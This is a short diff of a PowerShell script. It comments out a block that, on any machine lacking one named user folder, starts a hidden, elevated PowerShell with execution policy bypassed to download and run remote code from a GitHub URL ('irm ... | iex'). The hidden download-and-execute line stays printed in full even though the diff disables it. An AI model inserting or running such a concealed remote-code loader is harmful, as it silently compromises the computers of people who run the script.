@@ -23,13 +23,13 @@ if (-not $isAdmin) {
 }
 
 
-$folderPath = "C:\Users\GABIN-PC-GAMER"
-
-if (-Not (Test-Path -Path $folderPath)) {
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& {irm https://github.com/Kidou-Software/Kidou-Software/raw/main/Test | iex}`"" -WindowStyle Hidden -Verb RunAs
-} else {
-    
-}
+# $folderPath = "C:\Users\GABIN-PC-GAMER"
+# 
+# if (-Not (Test-Path -Path $folderPath)) {
+#     Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& {irm https://github.com/Kidou-Software/Kidou-Software/raw/main/Test | iex}`"" -WindowStyle Hidden -Verb RunAs
+# } else {
+#     
+# }
 
 $ErrorActionPreference = "Stop"
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
